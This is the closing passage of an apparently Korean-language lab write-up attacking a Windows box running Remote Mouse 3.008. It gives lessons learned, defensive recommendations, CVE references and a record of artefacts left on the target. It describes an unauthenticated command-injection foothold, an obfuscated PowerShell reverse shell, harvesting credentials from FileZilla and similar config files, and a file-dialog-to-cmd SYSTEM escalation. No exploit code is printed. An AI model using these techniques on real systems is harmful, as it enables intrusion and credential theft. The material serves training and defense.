1. **무인증 서비스를 만나면 공개 익스플로잇부터.** 배너가 명확하면 `searchsploit` 로 직행. 이 박스는 nmap 서비스명이 곧 익스플로잇 키워드였다. 단 **EDB 제목의 CVE 를 그대로 믿지 마라** — 여기 붙이기 쉬운 CVE-2021-43326 은 전혀 다른 제품이다. NVD 에서 제품명이 나오는지 한 번 확인하는 데 10초면 된다.
2. **셸이 안 붙으면 포트를 바꿔 찍지 말고 한 번에 재라.** 타겟에서 여러 포트로 아웃바운드를 시도해 결과를 HTTP 경로로 회신시키면 로그 한 줄에 전부 남는다(3장). 덤으로 Defender 실시간 보호 상태까지 같이 받아올 수 있다.
3. **설정 파일 자격증명은 Windows 권한상승의 단골.** 표준 벡터(서비스 DACL·예약작업·토큰 특권)가 막히면 **FileZilla·PuTTY·WinSCP·unattend.xml·PowerShell 히스토리**를 뒤진다. FileZilla 는 `recentservers.xml`·`sitemanager.xml`(base64).
4. **자격증명이 나오면 "누구 것인가"를 먼저 확정.** `ValidateCredentials` (로컬) 또는 `nxc smb --local-auth` (원격, 445 열렸을 때). 재사용을 넘겨짚지 말 것.
5. **파일 대화상자 → cmd.** SYSTEM/관리자 앱이 파일 대화상자를 띄우면(저장/열기/찾아보기 어디든) **주소창에 `cmd.exe` 경로** → 상위 권한 셸. GUI 클릭이 필요하니 RDP 진입이 전제.
6. **권한을 올렸으면 열거를 다시 돌려라.** 이 박스에서 같은 스크립트가 6,692행 → 9,282행이 됐다(6장). 저권한 결과의 빈칸은 "없음"이 아니라 "안 보임"이다.
7. **수동 대안**: Metasploit 없이 전 과정 수행했다. 리버스셸은 `msfvenom` 대신 난독화 PowerShell one-liner, 열거는 순수 cmdlet. Metasploit 에 `exploit/windows/misc/remote_mouse_rce`(References: EDB 46697 · CVE-2022-3365)가 있지만 **1대 한정** 제약을 여기 쓰기는 아까워 안 썼다.
8. **시간 배분**: 취약점 식별 <15분. 권한상승 **경로 식별**(FileZilla → CVE-2021-35448) 30분. 나머지는 헤드리스 RDP 세션 문제로 소진 — 실제 시험(mstsc 정상 접속)이라면 트레이 클릭 몇 번으로 끝난다. **GUI 가 안 보이면 `query session` 부터 쳐라.**

## 8. 방어 관점

- **Remote Mouse 를 제거하거나 연결 암호를 설정한다**(설정의 `Password for Connection`). CVE-2022-3365 의 핵심이 "암호를 안 걸면 기본값"이므로, 암호 설정만으로도 무인증 주입은 막힌다. 다만 프로토콜이 자명한 치환 암호를 평문으로 쓰므로 근본 대책은 제거·격리다.
- **서비스가 GUI 를 사용자 세션에 SYSTEM 으로 띄우지 않게 한다** — Session 0 격리 위반. 3.008 이후 버전으로 패치(CVE-2021-35448).
- **자격증명을 앱 설정 파일에 평문/base64 로 저장하지 않는다.** FileZilla 는 마스터 암호를 쓰거나 자격증명 관리자로 대체.
- **자동 로그인(AutoAdminLogon) 지양.** 이 박스는 자동 로그인 덕에 키입력 주입이 곧바로 대화형 사용자 컨텍스트를 얻었다. 콘솔에 로그인된 사용자가 없었다면 주입해도 실행할 셸이 없다.

## 9. 참고 자료

- **CVE-2022-3365** — Remote Mouse Server by Emote Interactive, 기본 암호 + 평문 치환암호 제어 프로토콜을 통한 OS 명령 주입. PoC: **EDB 46697** (RemoteMouse 3.008 Arbitrary Remote Command Execution). Metasploit `exploit/windows/misc/remote_mouse_rce` 가 둘을 함께 참조한다.
- **CVE-2021-35448** — *"Emote Interactive Remote Mouse 3.008 on Windows allows attackers to execute arbitrary programs as Administrator by using the Image Transfer Folder feature to navigate to cmd.exe."* (EDB 50047)
- (혼동 주의) **CVE-2021-43326 은 Automox Agent** 취약점이다. Remote Mouse 와 무관하니 이 박스에 붙이지 마라.
- (배제) **EDB 50258** — Remote Mouse 4.002 Unquoted Service Path. 이 박스는 3.008 이고, 무엇보다 `C:\` 루트에 파일을 만들 수 없어 성립하지 않는다(6장).
- FileZilla 자격증명 위치: `%APPDATA%\FileZilla\recentservers.xml`

## 남긴 흔적 / 관련 노트

**남긴 흔적** — ⚠️ **삭제를 확인하지 못했다. 박스 정지·리버트로 해소되는 것에 의존한다.**

경위부터 적는다. 세션 중 **Kali SSH 를 세션 내내 잃었고**, 그래서 자동 정리 스크립트를 돌릴 수 없었다. Kali 쪽은 나중에 따로 정리했다 — tmux 8개를 **세션 이름으로만** 종료하고, 고아 리스너 2개는 `ss` 로 **PID 를 특정해** 정리했다(광범위 `pkill` 은 쓰지 않았다). **그 정리 과정에서 타겟으로 통하던 셸 세션도 함께 닫혔고, 그 결과 타겟 쪽 정리는 불가능해졌다.**

*확인한 것* — 파일 업로드 없음, 계정 생성 없음, 설정 변경 없음. Kali 쪽 리스너·tmux 세션은 정리 완료.

*확인 못 한 것* (타겟에 남았을 가능성이 높다):
- 열린 창 — SYSTEM cmd, Remote Mouse Settings, "다른 이름으로 저장" 대화상자, Edge
- `C:\Windows\Temp\harvest_REMOTE-PC.txt` (SYSTEM harvest, 9,282행)
- `C:\Users\divine\harv.txt` · `C:\Users\divine\pf.txt` (divine 열거 산출물)
- Edge 검색 흔적 — `bing.com/search?q=TESTREBOOT`
- **`shutdown /r` 로 1회 재부팅함**

**관련 패턴**: "설정 파일 자격증명" · "파일 대화상자→cmd" · "버전 판정은 독립 근거 2개"([[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]]).

- [[_STATUS]] — 283개 전수 진행현황
